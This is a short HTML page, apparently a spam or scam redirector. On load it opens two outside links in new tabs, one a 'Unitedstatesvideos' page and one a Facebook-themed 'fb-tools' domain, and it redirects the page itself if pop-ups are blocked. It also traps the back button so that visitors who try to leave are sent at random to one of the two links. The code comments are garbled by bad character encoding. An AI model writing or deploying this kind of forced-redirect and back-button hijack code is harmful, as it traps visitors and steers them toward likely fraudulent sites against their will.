<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instant Auto Redirect</title>
</head>
<body style="margin:0;padding:0;background:#000;">
<script>
(function(){
  var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
  var link2 = "https://fb-tools.social-networking.me";

  // ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶≤‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶π‡¶¨‡ßá
  window.addEventListener("load", function(){
    // ‡¶™‡ßç‡¶∞‡¶•‡¶Æ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶ü‡ßç‡¶Ø‡¶æ‡¶¨‡ßá ‡¶ñ‡ßÅ‡¶≤‡¶¨‡ßá
    var w1 = window.open(link1, "_blank");

    // ‡¶¶‡ßç‡¶¨‡¶ø‡¶§‡ßÄ‡ßü ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶è‡¶ï‡¶ü‡ßÅ ‡¶™‡¶∞‡ßá ‡¶ü‡ßç‡¶Ø‡¶æ‡¶¨‡ßá ‡¶ñ‡ßÅ‡¶≤‡¶¨‡ßá
    setTimeout(function(){
      var w2 = window.open(link2, "_blank");
      if(!w2 || w2.closed){
        window.location.href = link2;
      }
    }, 400);

    // fallback for first link
    setTimeout(function(){
      if(!w1 || w1.closed){
        window.location.href = link1;
      }
    }, 800);
  });

  // üîÑ Back button trap (random link)
  history.pushState(null, null, location.href);
  window.onpopstate = function () {
    history.pushState(null, null, location.href);
    var targets = [link1, link2];
    var rand = targets[Math.floor(Math.random() * targets.length)];
    window.location.href = rand;
  };
})();
</script>
</body>
</html>
